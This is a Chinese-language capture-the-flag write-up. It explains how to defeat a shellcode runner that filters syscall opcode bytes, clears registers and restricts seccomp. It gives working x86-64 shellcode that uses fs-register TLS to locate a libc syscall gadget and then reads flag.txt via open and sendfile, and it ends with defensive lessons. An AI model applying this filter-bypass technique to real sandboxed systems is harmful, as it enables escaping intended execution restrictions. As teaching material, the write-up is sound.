# super secure blob runner

## 题目简述

程序把最多 0x1000 字节 shellcode 映射为可执行内存，但扫描并拒绝 `0f`、`05`、`cd`、`80`，阻止直接编码 `syscall` 和 `int 0x80`。seccomp 只允许 `open`、`sendfile`、`exit`。跳入 shellcode 前，除 `fs` 段寄存器外的通用寄存器以及 `rsp`、`rbp` 都被清零。

## 解题过程

虽然通用寄存器被清空，Linux 线程局部存储仍由 `fs` 指向。题目运行环境中，`fs:0` 可作为稳定的 TLS 派生地址；配合固定偏移 `0x93bd6` 能定位 libc 内的 `syscall; ret` gadget。`fs:0x300` 则提供一个可用的栈地址，先恢复 `rsp`，才能安全执行 `push` 和 `call`：

```asm
mov rsp, fs:0x300
mov rbx, fs:0x0
add rbx, 0x093bd6
```

shellcode 本身不含被禁字节。把 `flag.txt` 的小端整数压栈，设置 `open` 参数，然后以普通 `call rbx` 进入现成的 syscall gadget：

```asm
push rcx
movabs rcx, 0x7478742e67616c66
push rcx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
call rbx
```

`open` 返回的文件描述符位于 `rax`。seccomp 允许 `sendfile`，所以无需 `read`、`write`：

```asm
mov rsi, rax
mov rdi, 1
mov rdx, 0
mov r10, 100
mov rax, 40
call rbx

mov rax, 60
call rbx
```

这会把 flag 文件直接发送到标准输出，再正常退出，得到：

```text
grey{ret_to_thread_local_storage_via_fs_register}
```

## 方法总结

过滤 syscall 指令字节并不等于阻断系统调用：只要进程地址空间中已有可达的 syscall gadget，就能用不含敏感字节的 `call` 间接执行。清空通用寄存器也不完整，因为段寄存器和 TLS 仍泄露可用地址与栈。真正的边界应由严格 seccomp 策略和最小权限文件描述符建立，字节黑名单只能作为辅助检查。
